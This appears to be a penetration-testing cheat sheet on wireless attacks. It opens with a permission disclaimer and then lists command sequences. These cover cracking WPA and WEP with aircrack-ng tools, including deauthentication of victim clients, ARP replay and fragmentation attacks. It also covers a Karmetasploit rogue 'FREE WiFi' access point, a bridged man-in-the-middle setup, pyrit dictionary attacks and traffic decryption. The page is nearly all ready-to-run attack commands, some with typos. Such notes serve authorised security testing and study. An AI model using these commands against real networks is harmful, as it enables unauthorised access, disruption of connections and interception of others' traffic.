# Wireless

{% hint style="success" %}
Hack Responsibly.

Always ensure you have **explicit** permission to access any computer system **before** using any of the techniques contained in these documents.  You accept full responsibility for your actions by applying any knowledge gained here.  
{% endhint %}

[https://www.bettercap.org/](https://www.bettercap.org/)

[https://miloserdov.org/?p=1112\#1](https://miloserdov.org/?p=1112#1)

Nothing here yet...please feel free to contribute at [https://www.github.com/zweilosec](https://github.com/zweilosec)



## Choosing a wireless module

You must choose a wireless module that has a chipset that is capable of being put in monitor mode.  The site below has a fairly comprehensive list of adapters that support this.  

[https://miloserdov.org/?p=2196](https://miloserdov.org/?p=2196)

## **Setting TX \(transmit\) POWER**

`iw reg set BO`  
`iwconfig wlan0 txpower 25`

## **Cracking WPA**

`airmon-ng start wlan0`  
`airodump-ng -c $channel --bssid $AP_MAC -w $out_file wlan0mon`  
`aireplay-ng -0 1 -a $AP_MAC -c $victim_MAC wlan0mon` \#{de-authentication attack}  
`aircrack-ng -0 -w $pass_list $cap_file`

## **Cracking WEP**

###  **with Connected Clients**

`airmon-ng start wlan0 #[$channel]`  
`airodump-ng -c $channel --bssid $AP_MAC -w $out_file wlan0mon`  
`aireplay-ng -1 0 -e $ESSID -a $AP_MAC -h $host_MAC wlan0mon` \#{fake authentication}  
`aireplay-ng -3 -b $AP_MAC -h $host_MAC wlan0mon` \#{ARP replay attack}`aireplay-ng -0 1 -a $AP_MAC -c $client_MAC wlan0mon` \#{de-authentication attack - as needed}

### **via a Client**

`airmon-ng start wlan0 #[$channel]`  
`airodump-ng -c $channel --bssid $AP_MAC -w $out_file wlan0mon`  
`aireplay-ng -1 0 -e $ESSID -a $AP_MAC -h $host_MAC wlan0mon` \#{fake authentication}  
`aireplay-ng -2 -b $AP_MAC -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 wlan0mon`  
`aireplay-ng -2 -r $in_cap_file wlan0mon` \#{inject using cap file}  
`aircrack-ng -0 -z -n 64 $in_cap_file`

### **ARP amplification**

`airmon-ng start wlan0 #[$channel]`  
`airodump-ng -c $channel --bssid $AP_MAC -w $out_file wlan0mon`  
`aireplay-ng -1 500 -q 8 -a $AP_MAC wlan0mon`  
`areplay-ng -5 -b $AP_MAC -h $host_MAC wlan0mon`  
`packetforge-ng -0 -a $AP_MAC -h $host_MAC -k 255.255.255.255 -l 255.255.255.255 -y $FRAGMENT_XOR   -w $out_cap_file`  
`tcpdump -n -vvv -e -s0 -r $in_cap_file`  
`packetforge-ng -0 -a $AP_MAC -h $host_MAC -k $destIP) -l $srcIP) -y $FRAGMENT_XOR -w $out_cap_file`  
`aireplay-ng -2 -r $in_cap_file wlan0mon`

### **Cracking WEP /w shared key AUTH**

`airmon-ng start wlan0 #[$channel]`  
`airodump-ng -c $channel --bssid $AP_MAC -w $out_file wlan0mon`  
\#getting errors here: `aireplay-ng -1 0 -e $ESSID -a $AP_MAC -h $host_MAC wlan0mon` \#{fake authentication}  
`aireplay-ng -0 1 -a #AP_MAC -c $client_MAC wlan0mon` \#{de-authentication attack}  
`aireplay-ng -1 60 -e $ESSID -y $sharedkey_file -a $AP_MAC -h $host_MAC wlan0mon` \#{fake authentication /w PRGA XOR file}  
`aireplay-ng -3 -b $AP_MAC -h $host_MAC wlan0mon` \#{ARP replay attack}  
`aireplay-ng -0 1 -a $AP_MAC -c $client_MAC wlan0mon` \#{de-authentication attack}  
`aircrack-ng -0 -z -n 64 $in_cap_file` \#{PTW attack; \[-n\]: Specify the length of the key: 64 for 40-bit WEP, 128 for 104-bit WEP}

### **Cracking a Clientless WEP \(FRAG AND KOREK\)**

#### _{FRAG}_

airmon-ng start wlan0 \(channel\)  
airodump-ng -c \(channel\) –bssid \(AP MAC\) -w \(filename\) wlan0mon  
aireplay-ng -1 60 -e \(ESSID\) -a \(AP MAC\) -h \(OUR MAC\) wlan0mon {fake authentication}  
~aireplay-ng -5 \(frag attack\) -b \(AP MAC\) -h \(OUR MAC\) wlan0mon  
packetforge-ng -0 -a \(APMAC\) -h \(OUR MAC\) -l 255.255.255.255 -k 255.255.255.255 -y \(fragment filename\) -w filename.cap  
tcpdump -n -vvv -e -s0 -r filename.cap {TEST}  
aireplay-ng -2 -r filename.cap wlan0mon

#### _{KOREK}_

~aireplay-ng -4 -b \(AP MAC\) -h \(OUR MAC\) wlan0mon  
tcpdump -s 0 -s -e -r replayfilename.cap  
packetforge-ng -0 -a \(APMAC\) -h \(OUR MAC\) -l 255.255.255.255\(source IP\) -k 255.255.255.255\(dest IP\) -y \(fragmentfilename xor\) -w filename.cap  
aireplay-ng -2 -r filename.cap wlan0mon  
aircrack-ng -0 filename.cap

## **Karmetasploit**

airbase-ng -c \(channel\) -P -C 60 -e “FREE WiFi” -v wlan0mon  
ifconfig at0 up 10.0.0.1/24  
mkdir -p /var/run/dhcpd  
chown -R dhcpd:dhcpd /var/run/dhcpd  
touch /var/lib/dhcp3/dhcpd.leases  
cat dhcpd.conf  
touch /tmp/dhcp.log  
chown dhcpd:dhcpd /tmp/dhcp.log  
dhcpd3 -f -cf /tmp/dhcpd.conf -pf /var/run/dhcpd/pid -lf /tmp/dhcp.log at0  
msfconsole -r /root/karma.rc

## **MISC**

### **Bridge-control man in the middle**

airebase-ng -c 3 -e “FREE WiFi” wlan0mon  
brctl addbr hacker\(interface name\)  
brctl addif hacker eth0  
brctl addif hacker at0  
ifconfig eth0 0.0.0.0 up  
ifconfig at0 0.0.0.0 up  
ifconfig hacker 192.168.1.8 up  
ifconfig hacker  
echo 1 &gt; /proc/sys/net/ipv4/ip\_forward

### **pyrit DB attacks**

pyrit eval  
pyrit -i \(wordlist\) import\_passwords  
pyrit -e \(essid\) create\_essid  
pyrit batch  
pyrit batch -r \(capturefile\) -b\(AP MAC\) attack\_db

**pyrit strip**  
pyrit -r \(capturefile\) -o \(capturefile output\) strip

**pyrit dictionary attack**  
pyrit -r \(capturefile\) -i \(/pathtowordlist\) -b \(AP MAC\) attack\_passthrough

### **airgraph-ng**

airgraph-ng -i filename.csv -g CAPR -o outputfilename.png  
eog outputfilename.png  
airgraph-ng -i filename.csv -g CPG -o outputfilename.png  
eog outputfilename.png

### **airdecap-ng**

airdecap-ng -b \(vic ap\) outputfilename.cap  
wireshark outputfilename.cap  
airdecap-ng -w \(WEP KEY\) \(capturefile.cap\)  
wireshark capturefile-DEC.cap  
airdecap-ng -e \(ESSID VIC\) -p \(WPA PASSWORD\) \(capturefile.cap\)  
wireshark capturefile-dec.cap

